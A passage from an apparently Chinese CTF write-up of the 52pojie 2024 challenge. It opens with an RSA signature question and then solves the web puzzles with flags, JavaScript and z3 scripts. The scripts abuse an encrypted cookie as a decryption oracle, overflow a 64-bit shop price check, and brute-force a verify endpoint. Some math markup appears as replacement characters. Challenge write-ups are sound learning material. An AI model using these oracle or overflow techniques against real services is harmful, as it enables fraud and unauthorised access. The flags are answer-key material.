1px; width: 0.003em;"></span></span><span>c</span><span>d<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>(</span><span>p</span><span>−</span><span>1</span><span>,</span><span>q<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>−</span><span>1</span><span>)</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>���(�−1,�−1)</span></span> 的值(实际上是2)，这样才能得到 e。</p><p>相关代码见 final.py 的 get_e 函数。</p><p>但我认为“猜”到 e d 不是模 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 2.281em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.974em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>ϕ</span><span>(</span><span>n</span><span>)</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>�(�)</span></span> 而是 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 2.281em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.974em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>λ</span><span>(</span><span>n</span><span>)</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>�(�)</span></span> 的逆元这点是不太现实的，尤其是 Boneh-Durfee Attack 可能需要调参。希望有大佬能为我解惑——有无除继续爆破e以外的、不需要通过“猜”得出 e 的方法，或 practical 的签名伪造方案QAQ。</p><h2>Web 题</h2><p>（初级题反而是最后出的QAQ，毕竟后面的题目熟悉 js 就行，初级题要观察和猜测。</p><h3>flag1</h3><p>视频开头的波浪效果，慢放并多看几次即可。flag1{52pj2024}</p><h3>flag2</h3><p>访问 https://2024challenge.52pojie.cn/ （URL 通过去年网址猜测，或者通过拼接二维码得到）</p><p>发现302响应的报头中包含 X-Flag2: flag2{xHOpRP}</p><h3>flag3</h3><p>视频开头噪声中变动的部分，慢放并多看几次即可。flag3{GRsgk2}</p><h3>flag4/flag10</h3><p>打开 https://2024challenge.52pojie.cn/flag4_flag10.png 即看到 flag4{YvJZNS}</p><p>用 Stegsolve.jar inversion color 后看到 flag10{6BxMkW}</p><h3>flagA</h3><p>登录时返回cookie中有flagA字段(该字段是加密的，但可猜测其解密方法同Cookie中的uid字段，因此把加密的uid内容改成加密的flagA内容后进行请求，可获得解密的uid(可以预见解密未作校验))</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">main</span>(uid_value) {<br />    <span style="color: rgb(150, 203, 254);">let</span> resp = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/auth/login"</span>, {<br />        <span style="color: rgb(168, 255, 96);">"headers"</span>: {<br />            <span style="color: rgb(168, 255, 96);">"content-type"</span>: <span style="color: rgb(168, 255, 96);">"application/x-www-form-urlencoded"</span><br />        },<br />        <span style="color: rgb(168, 255, 96);">"body"</span>: <span style="color: rgb(168, 255, 96);">"uid="</span> + uid_value,<br />        <span style="color: rgb(168, 255, 96);">"method"</span>: <span style="color: rgb(168, 255, 96);">"POST"</span>,<br />        <span style="color: rgb(168, 255, 96);">"redirect"</span>: <span style="color: rgb(168, 255, 96);">"manual"</span>,<br />    });<br />    <span style="color: rgb(150, 203, 254);">let</span> ret = resp.headers.<span style="color: rgb(255, 255, 182);">getSetCookie</span>().<span style="color: rgb(255, 255, 182);">filter</span>(v =&gt; v.<span style="color: rgb(255, 255, 182);">startsWith</span>(<span style="color: rgb(168, 255, 96);">'flagA='</span>))[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">split</span>(<span style="color: rgb(168, 255, 96);">';'</span>)[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">slice</span>(<span style="color: rgb(255, 115, 253);">6</span>);<br />    <span style="color: rgb(150, 203, 254);">let</span> resp2 = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/auth/uid"</span>, {<br />        <span style="color: rgb(168, 255, 96);">"method"</span>: <span style="color: rgb(168, 255, 96);">"GET"</span>,<br />        <span style="color: rgb(168, 255, 96);">"headers"</span>: {<br />            <span style="color: rgb(168, 255, 96);">"cookie"</span>: <span style="color: rgb(168, 255, 96);">`uid=<span style="color: rgb(218, 239, 163);">${ret}</span>`</span><br />        }<br />    });<br />    <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(150, 203, 254);">await</span> resp2.<span style="color: rgb(255, 255, 182);">text</span>());<br />}<br /><span style="color: rgb(255, 255, 182);">main</span>(<span style="color: rgb(255, 115, 253);">691872</span>);</code></pre><p>此处加密和后面的2048小游戏相同，但由于登录接口只给数字加密，因此没法直接完成小游戏。</p><h3>flag5/flag9</h3><p>复制网页源码隐藏内容中的字符到编辑器，去掉其中的特殊字符，得到 flag5{P3prqF}。</p><p>对整个隐藏内容进行适当换行，看到字符画 flag9{KHTALK}。</p><h3>flag6</h3><p>查看网页源码知：flag 内容为数字，且 md5 为 1c450bbafad15ad87c32831fa1a616fc。</p><p>cmd5 反查 MD5 知：flag 为 flag6{20240217}。</p><h3>flag7</h3><p>视频末尾提到了github仓库，找到其历史commit的内容：flag7{Djl9NQ}</p><h3>flag8/flagB</h3><p>https://2024challenge.52pojie.cn/flagB/index.html 为 2048 小游戏。</p><p>玩一会后v他50得到提示为溢出，尝试溢出 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.542em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.296em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.296em; height: 0px;"><span><span>2</span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>32</span></span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span></span></span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 0.988em;"></span></span></span><span></span></span><span>232</span></span> 未果，因此尝试溢出 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.542em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.296em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 1.296em; height: 0px;"><span><span>2</span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>64</span></span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span></span></span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 0.988em;"></span></span></span><span></span></span><span>264</span></span>，发现要求金额必须减少而不是增加。</p><p>把这些要求输入 z3 即可得到合适的购买数量：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">from</span> z3 <span style="color: rgb(150, 203, 254);">import</span> *<br />v = BitVec(<span style="color: rgb(168, 255, 96);">'a'</span>, <span style="color: rgb(255, 115, 253);">64</span>)<br />s=Solver()<br />s.add(v&gt;<span style="color: rgb(255, 115, 253);">0</span>)<br />s.add(<span style="color: rgb(255, 115, 253);">999063388</span>*v&lt;<span style="color: rgb(255, 115, 253);">570</span>)<br />s.add(<span style="color: rgb(255, 115, 253);">570</span>-<span style="color: rgb(255, 115, 253);">999063388</span> * v &lt; <span style="color: rgb(255, 115, 253);">570</span>)<br />s.check()<br />print(s.model())</code></pre><p>其中 flag8 为 flag8{OaOjIK}。</p><p>flag8 由于数量较少，可以多次手玩，也可以使用 网上的简单 AI 自动玩。</p><p>自动获取这部分 flag 的代码见下（2048ai.js 及其依赖 session_fetcher.mjs 见附件，是对 https://github.com/aj-r/2048-AI 内容进行适当包装所得）</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">const</span> { runAI } = require(<span style="color: rgb(168, 255, 96);">'./2048ai'</span>);<br /><br /><span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">main</span>(uid_value) {<br />    <span style="color: rgb(150, 203, 254);">let</span> resp = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/auth/login"</span>, {<br />        <span style="color: rgb(168, 255, 96);">"headers"</span>: {<br />            <span style="color: rgb(168, 255, 96);">"content-type"</span>: <span style="color: rgb(168, 255, 96);">"application/x-www-form-urlencoded"</span><br />        },<br />        <span style="color: rgb(168, 255, 96);">"body"</span>: <span style="color: rgb(168, 255, 96);">"uid="</span> + uid_value,<br />        <span style="color: rgb(168, 255, 96);">"method"</span>: <span style="color: rgb(168, 255, 96);">"POST"</span>,<br />        <span style="color: rgb(168, 255, 96);">"redirect"</span>: <span style="color: rgb(168, 255, 96);">"manual"</span>,<br />    });<br />    <span style="color: rgb(150, 203, 254);">let</span> uid = resp.headers.<span style="color: rgb(255, 255, 182);">getSetCookie</span>().<span style="color: rgb(255, 255, 182);">filter</span>(v =&gt; v.<span style="color: rgb(255, 255, 182);">startsWith</span>(<span style="color: rgb(168, 255, 96);">'uid='</span>))[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">split</span>(<span style="color: rgb(168, 255, 96);">';'</span>)[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">slice</span>(<span style="color: rgb(255, 115, 253);">4</span>);<br />    <span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">buyItem</span>(item, cnt, result) {<br />        <span style="color: rgb(150, 203, 254);">const</span> session = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">runAI</span>(uid, money =&gt; money &gt;= <span style="color: rgb(255, 115, 253);">10</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />        <span style="color: rgb(150, 203, 254);">let</span> resp = <span style="color: rgb(150, 203, 254);">await</span> session.<span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">'/flagB/buy_item'</span>, {method: <span style="color: rgb(168, 255, 96);">'POST'</span>, headers: {<span style="color: rgb(168, 255, 96);">'Content-Type'</span>: <span style="color: rgb(168, 255, 96);">'application/x-www-form-urlencoded'</span>}, body: <span style="color: rgb(168, 255, 96);">`shop_item_id=<span style="color: rgb(218, 239, 163);">${encodeURIComponent(item)}</span>&amp;buy_count=<span style="color: rgb(218, 239, 163);">${encodeURIComponent(cnt)}</span>`</span>});<br />        <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(150, 203, 254);">await</span> resp.<span style="color: rgb(255, 255, 182);">json</span>());<br />        resp = <span style="color: rgb(150, 203, 254);">await</span> session.<span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">'/flagB/use_item'</span>, {method: <span style="color: rgb(168, 255, 96);">'POST'</span>, headers: {<span style="color: rgb(168, 255, 96);">'Content-Type'</span>: <span style="color: rgb(168, 255, 96);">'application/x-www-form-urlencoded'</span>}, body: <span style="color: rgb(168, 255, 96);">`item_id=<span style="color: rgb(218, 239, 163);">${encodeURIComponent(item)}</span>`</span>});<br />        <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(result + <span style="color: rgb(168, 255, 96);">':'</span>, <span style="color: rgb(150, 203, 254);">await</span> resp.<span style="color: rgb(255, 255, 182);">json</span>());<br />    }<br />    <span style="color: rgb(124, 124, 124);">/* calc way:<br />from z3 import *<br />v = BitVec('a', 64)<br />s=Solver()<br />s.add(v&gt;0)<br />s.add(10000*v&lt;20)<br />s.add(10000*v&gt;0)<br />s.check()<br />print(s.model())<br />    */</span><br />    <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">buyItem</span>(<span style="color: rgb(168, 255, 96);">'4'</span>, <span style="color: rgb(168, 255, 96);">'182622766329724561'</span>, <span style="color: rgb(168, 255, 96);">'8'</span>);<br />    <span style="color: rgb(124, 124, 124);">/* calc way:<br />from z3 import *<br />v = BitVec('a', 64)<br />s=Solver()<br />s.add(v&gt;0)<br />s.add(999063388*v&lt;10)<br />s.add(999063388*v&gt;0)<br />s.check()<br />print(s.model())<br />    */</span><br />    <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">buyItem</span>(<span style="color: rgb(168, 255, 96);">'5'</span>, <span style="color: rgb(168, 255, 96);">'3952873735356057550'</span>, <span style="color: rgb(168, 255, 96);">'B'</span>);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">main</span>(<span style="color: rgb(255, 115, 253);">691872</span>);</code></pre><h3>flag11</h3><p>css 里要求填入两个数字，且搜索空间很小。</p><p>注意到算出来的每个贴图的x/y坐标不一定是整数，但两个图片的坐标之差应当是30的倍数；可基于这点搜索可行解。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">isok</span>(t):<br />    u = <span style="color: rgb(255, 115, 253);">30</span><br />    t = t % u<br />    <span style="color: rgb(150, 203, 254);">return</span> min(t, u-t) &lt; <span style="color: rgb(255, 115, 253);">0.001</span><br /><br /><span style="color: rgb(150, 203, 254);">for</span> i <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">100</span>):<br />    <span style="color: rgb(150, 203, 254);">for</span> j <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">100</span>):<br />        x1 = <span style="color: rgb(255, 115, 253);">942.5135817416999</span> + <span style="color: rgb(255, 115, 253);">1.0215884355337748</span> * i + <span style="color: rgb(255, 115, 253);">0.24768196677010001</span> * j<br />        y1 = <span style="color: rgb(255, 115, 253);">224.16483995058888</span> + <span style="color: rgb(255, 115, 253);">2.9293942195858147</span> * i + <span style="color: rgb(255, 115, 253);">0.8924085229409133</span> * j<br />        x2 = <span style="color: rgb(255, 115, 253);">68.82766156747003</span> + <span style="color: rgb(255, 115, 253);">7.845383167787458</span> * i + <span style="color: rgb(255, 115, 253);">3.2075066759810236</span> * j<br />        y2 = <span style="color: rgb(255, 115, 253);">427.5662592752474</span> + <span style="color: rgb(255, 115, 253);">0.6121410139677127</span> * i + <span style="color: rgb(255, 115, 253);">1.9485864366522536</span> * j<br />        dx = x2 - x1<br />        dy = y2 - y1<br />        <span style="color: rgb(150, 203, 254);">if</span> isok(dx) <span style="color: rgb(150, 203, 254);">and</span> isok(dy):<br />            print(i,j)</code></pre><p>只得到 71/20 这一个解，填入 html 并用浏览器打开后可在图片上看到 flag11{HPQfVF}。</p><p>(似乎很多人手完即可QAQ)</p><h3>flag12</h3><p>阅读js代码知：输入secret传入wasm，基于wasm的返回可显示flag12。</p><p>wasm 很小，可用 wabt 转成 c 代码阅读。将看到的约束条件丢 z3 可知输入应为 4005161829。</p><p>输入该值后，网页显示 flag12{HOXI}。</p><h3>flagC</h3><p>阅读js代码知：可跳过模型部分，改为直接与服务器交互。</p><p>根据提示确定正确的数量是4，而给的例子中已有4中不同种类的提示“种类正确”的物品。</p><p>猜测所有正确位置均可以是示例中的某个物品的位置，因此编写代码逐个爆破，发现可以得到解。</p><p>代码如下：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">test</span>(inp) {<br />    <span style="color: rgb(150, 203, 254);">let</span> res = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/flagC/verify"</span>, {<br />        <span style="color: rgb(168, 255, 96);">"headers"</span>: {<br />            <span style="color: rgb(168, 255, 96);">"content-type"</span>: <span style="color: rgb(168, 255, 96);">"application/json"</span><br />        },<br />        <span style="color: rgb(168, 255, 96);">"referrer"</span>: <span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/flagC/index.html"</span>,<br />        <span style="color: rgb(168, 255, 96);">"body"</span>: <span style="color: rgb(255, 255, 182);">JSON</span>.<span style="color: rgb(255, 255, 182);">stringify</span>(inp),<br />        <span style="color: rgb(168, 255, 96);">"method"</span>: <span style="color: rgb(168, 255, 96);">"POST"</span>,<br />    });<br />    <span style="color: rgb(150, 203, 254);">let</span> ret = <span style="color: rgb(150, 203, 254);">await</span> res.<span style="color: rgb(255, 255, 182);">json</span>();<br />    <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(ret);<br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}<br /><span style="color: rgb(255, 255, 182);">test</span>({<span style="color: rgb(168, 255, 96);">"boxes"</span>:[<span style="color: rgb(255, 115, 253);">0.0071830302476882935</span>,<span style="color: rgb(255, 115, 253);">0.5186262726783752</span>,<span style="color: rgb(255, 115, 253);">0.4009798765182495</span>,<span style="color: rgb(255, 115, 253);">0.6479262709617615</span>,<span style="color: rgb(255, 115, 253);">0.04319196939468384</span>,<span style="color: rgb(255, 115, 253);">0.0257604718208313</span>,<span style="color: rgb(255, 115, 253);">0.2734942138195038</span>,<span style="color: rgb(255, 115, 253);">0.4855906367301941</span>,<span style="color: rgb(255, 115, 253);">0.7787966132164001</span>,<span style="color: rgb(255, 115, 253);">0.2953517735004425</span>,<span style="color: rgb(255, 115, 253);">0.9544114470481873</span>,<span style="color: rgb(255, 115, 253);">0.45228806138038635</span>,<span style="color: rgb(255, 115, 253);">0.40771162509918213</span>,<span style="color: rgb(255, 115, 253);">0.5121312737464905</span>,<span style="color: rgb(255, 115, 253);">0.7820707559585571</span>,<span style="color: rgb(255, 115, 253);">0.7769460082054138</span>],<span style="color: rgb(168, 255, 96);">"scores"</span>:[<span style="color: rgb(255, 115, 253);">0.8548367619514465</span>,<span style="color: rgb(255, 115, 253);">0.7646901607513428</span>,<span style="color: rgb(255, 115, 253);">0.6844016909599304</span>,<span style="color: rgb(255, 115, 253);">0.42119961977005005</span>],<span style="color: rgb(168, 255, 96);">"classes"</span>:[<span style="color: rgb(255, 115, 253);">3</span>,<span style="color: rgb(255, 115, 253);">1</span>,<span style="color: rgb(255, 115, 253);">8</span>,<span style="color: rgb(255, 115, 253);">4</span>]}).<span style="color: rgb(255, 255, 182);">then</span>(v =&gt; <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(v.hint.<span style="color: rgb(255, 255, 182);">split</span>(<span style="color: rgb(168, 255, 96);">' '</span>)[<span style="color: rgb(255, 115, 253);">0</span>])); <span style="color: rgb(124, 124, 124);">// bingo answer</span><br /><span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">split</span>(v) {<br />    <span style="color: rgb(150, 203, 254);">let</span> {boxes, scores, classes} = v;<br />    <span style="color: rgb(150, 203, 254);">let</span> ret = [];<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">let</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; scores.length; i++) {<br />        ret.<span style="color: rgb(255, 255, 182);">push</span>({<br />            box: boxes.<span style="color: rgb(255, 255, 182);">slice</span>(i * <span style="color: rgb(255, 115, 253);">4</span>, i * <span style="color: rgb(255, 115, 253);">4</span> + <span style="color: rgb(255, 115, 253);">4</span>),<br />            score: scores[i],<br />            class: classes[i],<br />        });<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> ret;<br />}<br /><span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">glue</span>(v) {<br />    <span style="color: rgb(150, 203, 254);">let</span> boxes = [], scores = [], classes = [];<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">let</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; v.length; i++) {<br />        <span style="color: rgb(150, 203, 254);">let</span> {box, score, class: cls} = v[i];<br />        boxes.<span style="color: rgb(255, 255, 182);">push</span>(...box);<br />        scores.<span style="color: rgb(255, 255, 182);">push</span>(score);<br />        classes.<span style="color: rgb(255, 255, 182);">push</span>(cls);<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> {boxes, scores, classes};<br />}<br /><span style="color: rgb(150, 203, 254);">let</span> x = <span style="color: rgb(255, 255, 182);">split</span>({<span style="color: rgb(168, 255, 96);">"boxes"</span>:[<span style="color: rgb(255, 115, 253);">0.0071830302476882935</span>,<span style="color: rgb(255, 115, 253);">0.5186262726783752</span>,<span style="color: rgb(255, 115, 253);">0.4009798765182495</span>,<span style="color: rgb(255, 115, 253);">0.6479262709617615</span>,<span style="color: rgb(255, 115, 253);">0.40771162509918213</span>,<span style="color: rgb(255, 115, 253);">0.5121312737464905</span>,<span style="color: rgb(255, 115, 253);">0.7820707559585571</span>,<span style="color: rgb(255, 115, 253);">0.7769460082054138</span>,<span style="color: rgb(255, 115, 253);">0.3125038146972656</span>,<span style="color: rgb(255, 115, 253);">0.22943750023841858</span>,<span style="color: rgb(255, 115, 253);">0.728165864944458</span>,<span style="color: rgb(255, 115, 253);">0.46270015835762024</span>,<span style="color: rgb(255, 115, 253);">0.002122640609741211</span>,<span style="color: rgb(255, 115, 253);">0.8341933488845825</span>,<span style="color: rgb(255, 115, 253);">0.3802390992641449</span>,<span style="color: rgb(255, 115, 253);">0.9994925260543823</span>,<span style="color: rgb(255, 115, 253);">0.8375666737556458</span>,<span style="color: rgb(255, 115, 253);">0.6610859632492065</span>,<span style="color: rgb(255, 115, 253);">0.9833332896232605</span>,<span style="color: rgb(255, 115, 253);">0.9978412389755249</span>,<span style="color: rgb(255, 115, 253);">0.46407967805862427</span>,<span style="color: rgb(255, 115, 253);">0.7901232838630676</span>,<span style="color: rgb(255, 115, 253);">0.7629221081733704</span>,<span style="color: rgb(255, 115, 253);">0.9946883320808411</span>,<span style="color: rgb(255, 115, 253);">0.5860870480537415</span>,<span style="color: rgb(255, 115, 253);">0.015289496630430222</span>,<span style="color: rgb(255, 115, 253);">0.6056223511695862</span>,<span style="color: rgb(255, 115, 253);">0.05522865429520607</span>,<span style="color: rgb(255, 115, 253);">0.49284374713897705</span>,<span style="color: rgb(255, 115, 253);">0.019939623773097992</span>,<span style="color: rgb(255, 115, 253);">0.5142461061477661</span>,<span style="color: rgb(255, 115, 253);">0.06407386064529419</span>,<span style="color: rgb(255, 115, 253);">0.7947754263877869</span>,<span style="color: rgb(255, 115, 253);">0.4549929201602936</span>,<span style="color: rgb(255, 115, 253);">0.9924988150596619</span>,<span style="color: rgb(255, 115, 253);">0.638464093208313</span>,<span style="color: rgb(255, 115, 253);">0.7654308676719666</span>,<span style="color: rgb(255, 115, 253);">0.03613254427909851</span>,<span style="color: rgb(255, 115, 253);">0.9887222647666931</span>,<span style="color: rgb(255, 115, 253);">0.2596513032913208</span>,<span style="color: rgb(255, 115, 253);">0.04319196939468384</span>,<span style="color: rgb(255, 115, 253);">0.0257604718208313</span>,<span style="color: rgb(255, 115, 253);">0.2734942138195038</span>,<span style="color: rgb(255, 115, 253);">0.4855906367301941</span>,<span style="color: rgb(255, 115, 253);">0.7787966132164001</span>,<span style="color: rgb(255, 115, 253);">0.2953517735004425</span>,<span style="color: rgb(255, 115, 253);">0.9544114470481873</span>,<span style="color: rgb(255, 115, 253);">0.45228806138038635</span>,<span style="color: rgb(255, 115, 253);">0.41201093792915344</span>,<span style="color: rgb(255, 115, 253);">0.03150711581110954</span>,<span style="color: rgb(255, 115, 253);">0.42948994040489197</span>,<span style="color: rgb(255, 115, 253);">0.07240761816501617</span>,<span style="color: rgb(255, 115, 253);">0.01391458511352539</span>,<span style="color: rgb(255, 115, 253);">0.6711101531982422</span>,<span style="color: rgb(255, 115, 253);">0.41128668189048767</span>,<span style="color: rgb(255, 115, 253);">0.8037518262863159</span>],<span style="color: rgb(168, 255, 96);">"scores"</span>:[<span style="color: rgb(255, 115, 253);">0.8933815360069275</span>,<span style="color: rgb(255, 115, 253);">0.8905048966407776</span>,<span style="color: rgb(255, 115, 253);">0.884631872177124</span>,<span style="color: rgb(255, 115, 253);">0.8726911544799805</span>,<span style="color: rgb(255, 115, 253);">0.8570783138275146</span>,<span style="color: rgb(255, 115, 253);">0.8548367619514465</span>,<span style="color: rgb(255, 115, 253);">0.8514702916145325</span>,<span style="color: rgb(255, 115, 253);">0.8206561803817749</span>,<span style="color: rgb(255, 115, 253);">0.8038726449012756</span>,<span style="color: rgb(255, 115, 253);">0.7646901607513428</span>,<span style="color: rgb(255, 115, 253);">0.7232488393783569</span>,<span style="color: rgb(255, 115, 253);">0.6844016909599304</span>,<span style="color: rgb(255, 115, 253);">0.6817193031311035</span>,<span style="color: rgb(255, 115, 253);">0.42119961977005005</span>],<span style="color: rgb(168, 255, 96);">"classes"</span>:[<span style="color: rgb(255, 115, 253);">2</span>,<span style="color: rgb(255, 115, 253);">5</span>,<span style="color: rgb(255, 115, 253);">7</span>,<span style="color: rgb(255, 115, 253);">6</span>,<span style="color: rgb(255, 115, 253);">10</span>,<span style="color: rgb(255, 115, 253);">3</span>,<span style="color: rgb(255, 115, 253);">9</span>,<span style="color: rgb(255, 115, 253);">9</span>,<span style="color: rgb(255, 115, 253);">15</span>,<span style="color: rgb(255, 115, 253);">1</span>,<span style="color: rgb(255, 115, 253);">0</span>,<span style="color: rgb(255, 115, 253);">8</span>,<span style="color: rgb(255, 115, 253);">9</span>,<span style="color: 